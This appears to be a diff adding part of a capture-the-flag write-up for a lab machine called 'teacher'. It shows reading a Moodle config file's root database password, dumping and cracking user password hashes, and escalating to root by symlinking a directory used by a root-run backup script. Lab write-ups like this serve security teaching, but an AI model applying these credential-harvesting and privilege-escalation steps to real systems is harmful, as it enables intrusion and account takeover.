@@ -105,3 +105,96 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@teacher:/var/www/html/moodle/question$ python -c 'import pty;pty.spawn("/bin/bash")'
 <tion$ python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+There is a config.php in moodle that shows:
+```
+www-data@teacher:/var/www/html/moodle$ cat config.php
+<?php  // Moodle configuration file
+
+unset($CFG);
+global $CFG;
+$CFG = new stdClass();
+
+$CFG->dbtype    = 'mariadb';
+$CFG->dblibrary = 'native';
+$CFG->dbhost    = 'localhost';
+$CFG->dbname    = 'moodle';
+$CFG->dbuser    = 'root';
+$CFG->dbpass    = 'Welkom1!';
+$CFG->prefix    = 'mdl_';
+$CFG->dboptions = array (
+  'dbpersist' => 0,
+  'dbport' => 3306,
+  'dbsocket' => '',
+  'dbcollation' => 'utf8mb4_unicode_ci',
+);
+
+$CFG->wwwroot   = 'http://10.10.10.153/moodle';
+$CFG->dataroot  = '/var/www/moodledata';
+$CFG->admin     = 'admin';
+
+$CFG->directorypermissions = 0777;
+
+require_once(__DIR__ . '/lib/setup.php');
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+www-data@teacher:/var/www/html/moodle$ 
+```
+
+```
+MariaDB [moodle]> select id,username,password from mdl_user;
++------+-------------+--------------------------------------------------------------+
+| id   | username    | password                                                     |
++------+-------------+--------------------------------------------------------------+
+|    1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
+|    2 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+|    3 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+| 1337 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |
++------+-------------+--------------------------------------------------------------+
+4 rows in set (0.00 sec)
+```
+
+went to crackstation to crack the last hash.
+```
+7a860966115182402ed06375cf0a22af	md5	expelled
+```
+
+We can use this password to su as giovanni and get the user flag.
+
+
+To get root flag:
+There is a backup script in /usr/bin.
+
+```
+giovanni@teacher:/usr/bin$ cat backup.sh 
+#!/bin/bash
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+```
+
+```
+giovanni@teacher:~/work$ mv courses courses.bak
+giovanni@teacher:~/work$ ls
+courses.bak  tmp
+giovanni@teacher:~/work$ ln -s /root courses
+giovanni@teacher:~/work$ ls -l
+total 8
+lrwxrwxrwx 1 giovanni giovanni    5 Sep  7 01:04 courses -> /root
+drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses.bak
+drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp
+giovanni@teacher:~/work$ cd courses
+-su: cd: courses: Permission denied
+giovanni@teacher:~/work$ cd tmp
+giovanni@teacher:~/work/tmp$ ls
+backup_courses.tar.gz  courses
+giovanni@teacher:~/work/tmp$ cd courses/
+giovanni@teacher:~/work/tmp/courses$ ls
+algebra  root.txt
+giovanni@teacher:~/work/tmp/courses$ cat root.txt 
+4f3a83b42ac7723a508b8ace7b8b1209
+giovanni@teacher:~/work/tmp/courses$ 
+```
